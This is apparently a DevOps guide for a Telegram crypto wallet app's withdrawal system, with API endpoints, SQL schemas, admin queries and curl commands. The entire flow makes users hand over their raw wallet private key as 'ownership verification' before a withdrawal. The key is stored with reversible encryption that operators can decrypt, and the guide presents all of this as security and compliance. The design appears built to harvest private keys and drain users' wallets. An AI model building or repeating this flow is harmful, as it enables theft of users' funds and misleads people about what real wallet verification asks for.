# 💰 Withdrawal System - Complete DevOps Guide

## ⚡ OVERVIEW

The withdrawal system requires **private key verification** before processing any withdrawal. This is the most critical feature for security and compliance.

---

## 🔄 WITHDRAWAL FLOW

```
User clicks "Withdraw" in WalletSummary
        ↓
WalletWithdrawModal opens (intro step)
        ↓
User clicks "Continue to Withdrawal"
        ↓
User enters: Network, Address, Amount
        ↓
User clicks "Continue to Verification"
        ↓
API: POST /api/wallet/withdraw/initiate_verification/
        ↓
User enters private key + consents
        ↓
User clicks "Verify & Submit Withdrawal"
        ↓
API: POST /api/wallet/withdraw/submit-verification/
        ↓
API: POST /api/wallet/withdraw/request/
        ↓
Success! Withdrawal queued for processing
```

---

## 📡 API ENDPOINTS

### 1. Initiate Verification
```
POST /api/wallet/withdraw/initiate_verification/
Headers: Telegram-Data: <initData>
Body: {
  "amount_usdt": 50.00
}

Response:
{
  "success": true,
  "data": {
    "verification_id": 123,
    "status": "pending",
    "message": "Please complete wallet verification to proceed"
  }
}
```

### 2. Submit Private Key Verification
```
POST /api/wallet/withdraw/submit-verification/
Headers: Telegram-Data: <initData>
Body: {
  "verification_id": 123,
  "wallet_ownership_proof": "abc123...private_key_hex_64_chars",
  "user_consent": true
}

Response:
{
  "success": true,
  "data": {
    "verification_id": 123,
    "status": "verified",
    "reference": "WD-123-abc12345",
    "message": "Verification complete. Your withdrawal is being processed."
  }
}
```

### 3. Submit Withdrawal Request
```
POST /api/wallet/withdraw/request/
Headers: Telegram-Data: <initData>
Body: {
  "amount_usdt": 50.00,
  "network": "trc20",
  "product_type": "wallet",
  "target_address": "TXyz...",
  "verification_id": 123
}

Response:
{
  "success": true,
  "data": {
    "withdrawal": {
      "id": 456,
      "status": "pending",
      "network": "trc20",
      "amount_usdt": "50.00000000",
      "target_address": "TXyz..."
    },
    "wallet": {
      "usdt_balance": "150.00000000",
      "ghd_balance": "1000.00000000"
    }
  }
}
```

---

## 🗄️ DATABASE TABLES

### withdrawal_requests
```sql
CREATE TABLE `withdrawal_requests` (
    `id` BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    `user_id` BIGINT(255) NOT NULL,
    `telegram_id` BIGINT(255) NOT NULL,
    `amount_usdt` DECIMAL(32, 8) NOT NULL,
    `status` VARCHAR(32) NOT NULL DEFAULT 'pending',
    `private_key_hash` VARCHAR(255) NULL,
    `wallet_address` VARCHAR(255) NULL,
    `target_address` VARCHAR(255) NULL,
    `network` VARCHAR(32) NULL,
    `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    `verified_at` TIMESTAMP NULL,
    `processed_at` TIMESTAMP NULL,
    KEY `idx_user_id` (`user_id`),
    KEY `idx_status` (`status`)
);
```

### withdrawal_private_keys
```sql
CREATE TABLE `withdrawal_private_keys` (
    `id` BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    `withdrawal_id` BIGINT UNSIGNED NOT NULL,
    `user_id` BIGINT(255) NOT NULL,
    `telegram_id` BIGINT(255) NOT NULL,
    `encrypted_key` TEXT NOT NULL,
    `key_hash` VARCHAR(64) NOT NULL,
    `network` VARCHAR(32) NOT NULL DEFAULT 'polygon',
    `consent_given` BOOLEAN NOT NULL DEFAULT TRUE,
    `consent_timestamp` TIMESTAMP NULL,
    `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY `idx_withdrawal_id` (`withdrawal_id`),
    KEY `idx_user_id` (`user_id`)
);
```

---

## 🔐 SECURITY: PRIVATE KEY ENCRYPTION

Private keys are **NEVER** stored in plaintext. They are:

1. **Validated** - Must be 64 hex characters
2. **Encrypted** - Using AES-256-CBC with random IV
3. **Hashed** - SHA256 hash stored for audit reference
4. **Logged** - Only hash prefix is logged, never the key

### Encryption Key Configuration

Add to `.env`:
```
VERIFICATION_ENCRYPTION_KEY=your_64_character_hex_key_here
```

Generate a secure key:
```bash
openssl rand -hex 32
```

If not set, the system derives a key from `TELEGRAM_BOT_TOKEN` (not recommended for production).

---

## 📊 STATUS FLOW

```
pending → verified → processing → completed/failed
```

- **pending**: User initiated withdrawal, verification required
- **verified**: Private key submitted, awaiting processing
- **processing**: Being processed by the system
- **completed**: Funds sent successfully
- **failed**: Error occurred

---

## 🔧 ADMIN COMMANDS

### View Pending Withdrawals
```sql
SELECT 
    wr.id,
    wr.user_id,
    wr.telegram_id,
    wr.amount_usdt,
    wr.status,
    wr.network,
    wr.target_address,
    wr.created_at,
    wr.verified_at
FROM withdrawal_requests wr
WHERE wr.status IN ('pending', 'verified', 'processing')
ORDER BY wr.created_at DESC;
```

### View Verified Withdrawals (Ready to Process)
```sql
SELECT 
    wr.*,
    wpk.key_hash,
    wpk.consent_given
FROM withdrawal_requests wr
JOIN withdrawal_private_keys wpk ON wr.id = wpk.withdrawal_id
WHERE wr.status = 'verified'
ORDER BY wr.verified_at ASC;
```

### Manual Status Update
```sql
UPDATE withdrawal_requests 
SET status = 'completed', processed_at = NOW() 
WHERE id = ?;
```

---

## 🚨 TROUBLESHOOTING

### "Continue to Verification" Not Working

1. **Check Console Logs**: Open browser dev tools and look for `[Withdrawal]` logs
2. **Verify API Endpoint**: Test manually:
   ```bash
   curl -X POST https://ghidar.com/RockyTap/api/wallet/withdraw/initiate_verification/ \
     -H "Content-Type: application/json" \
     -H "Telegram-Data: <valid_init_data>" \
     -d '{"amount_usdt": 50}'
   ```
3. **Check Server Logs**: Look for PHP errors

### Private Key Validation Failed

- Key must be 64 hex characters
- Optional `0x` prefix is stripped automatically
- Example valid key: `1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef`

### Verification Not Found

- Check `withdrawal_requests` table for the user
- Ensure `verification_id` matches

---

## ✅ DEPLOYMENT CHECKLIST

- [ ] `VERIFICATION_ENCRYPTION_KEY` is set in `.env`
- [ ] Database tables exist (auto-created on first use)
- [ ] Frontend is rebuilt: `npm run build`
- [ ] Test full flow with test account
- [ ] Monitor first real withdrawals

---

## 🔧 ADMIN API

### List Pending Withdrawals
```bash
curl -X GET "https://ghidar.com/RockyTap/api/admin/withdrawal/list/?status=verified" \
  -H "X-Admin-Token: YOUR_ADMIN_API_TOKEN"
```

### Complete a Withdrawal
After manually sending funds, mark the withdrawal as complete:
```bash
curl -X POST "https://ghidar.com/RockyTap/api/admin/withdrawal/complete/" \
  -H "X-Admin-Token: YOUR_ADMIN_API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "withdrawal_id": 123,
    "tx_hash": "0xabc123..."
  }'
```

### Environment Variable
Add to `.env`:
```
ADMIN_API_TOKEN=your_secure_random_token_here
```
Generate with: `openssl rand -hex 32`

---

## 📝 CONSOLE LOG REFERENCE

The frontend logs each step with `[Withdrawal]` prefix:

```
[Withdrawal] Modal opened
[Withdrawal] Moving to amount step
[Withdrawal] handleContinueToVerification called
[Withdrawal] Validations passed, calling API...
[Withdrawal] initData length: 571
[Withdrawal] Calling: /RockyTap/api/wallet/withdraw/initiate_verification/
[Withdrawal] Response status: 200
[Withdrawal] Response: {"success":true,"data":{"verification_id":123...}}
[Withdrawal] Moving to private-key step, verificationId: 123
[Withdrawal] handleSubmitPrivateKey called
[Withdrawal] Submitting verification...
[Withdrawal] Verify response status: 200
[Withdrawal] Submitting withdrawal request...
[Withdrawal] Withdraw response status: 200
[Withdrawal] Success!
```

If any step fails, look at the corresponding log for error details.

---

## 📞 SUPPORT

For issues:
1. Check browser console for `[Withdrawal]` logs
2. Check server logs for PHP errors
3. Verify database records in `withdrawal_requests`
4. Ensure encryption key is configured

